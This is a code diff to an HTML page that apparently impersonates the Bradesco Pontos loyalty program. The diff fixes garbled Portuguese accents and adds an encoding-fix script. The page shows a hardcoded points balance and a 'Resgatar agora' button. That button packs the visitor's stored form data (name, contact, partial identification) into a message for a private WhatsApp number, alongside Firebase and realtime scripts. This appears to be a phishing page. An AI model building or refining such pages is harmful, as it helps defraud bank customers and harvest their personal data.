@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Pontos DisponÃƒÂ­veis | Bradesco Pontos</title>
+  <title>Pontos Disponíveis | Bradesco Pontos</title>
   <style>
     :root {
       color-scheme: light;
@@ -118,10 +118,10 @@
 <body>
   <main>
     <section class="result" aria-label="Resultado da consulta de pontos">
-      <div class="badge">Consulta concluÃƒÂ­da</div>
-      <h1>Pontos disponÃƒÂ­veis</h1>
+      <div class="badge">Consulta concluída</div>
+      <h1>Pontos disponíveis</h1>
       <strong class="points">38.982</strong>
-      <p>ApÃƒÂ³s a confirmaÃƒÂ§ÃƒÂ£o no aplicativo oficial, o prazo estimado para crÃƒÂ©dito em conta ÃƒÂ© de atÃƒÂ© 24 horas.</p>
+      <p>Após a confirmação no aplicativo oficial, o prazo estimado para crédito em conta é de até 24 horas.</p>
       <div class="actions">
         <a class="btn" id="resgatarAgora" href="#">Resgatar agora</a>
       </div>
@@ -130,6 +130,7 @@
   <script src="firebase-config.js"></script>
   <script src="realtime-config.js"></script>
   <script src="realtime-client.js"></script>
+  <script src="mojibake-fix.js"></script>
   <script>
     const whatsappNumber = "5511996896942"
     const formData = JSON.parse(sessionStorage.getItem("resgateForm") || "{}");
@@ -139,13 +140,13 @@
       event.preventDefault();
 
       const message = [
-        "OlÃƒÂ¡, gostaria de prosseguir com o atendimento de resgate de pontos.",
-        `Tipo de cliente: ${formData.cliente || "nÃƒÂ£o informado"}`,
-        `Nome/RazÃƒÂ£o social: ${formData.nomeCliente || "nÃƒÂ£o informado"}`,
-        `Contato: ${formData.contato || "nÃƒÂ£o informado"}`,
-        `IdentificaÃƒÂ§ÃƒÂ£o parcial/protocolo: ${formData.identificadorSeguro || "nÃƒÂ£o informado"}`,
-        `Perfil: ${formData.segmento || "nÃƒÂ£o informado"}`,
-        `Categoria de resgate: ${formData.categoria || "nÃƒÂ£o informado"}`,
+        "Olá, gostaria de prosseguir com o atendimento de resgate de pontos.",
+        `Tipo de cliente: ${formData.cliente || "não informado"}`,
+        `Nome/Razão social: ${formData.nomeCliente || "não informado"}`,
+        `Contato: ${formData.contato || "não informado"}`,
+        `Identificação parcial/protocolo: ${formData.identificadorSeguro || "não informado"}`,
+        `Perfil: ${formData.segmento || "não informado"}`,
+        `Categoria de resgate: ${formData.categoria || "não informado"}`,
         `Pontos consultados: ${formData.pontos || "38.982"}`
       ].join("\n");
 
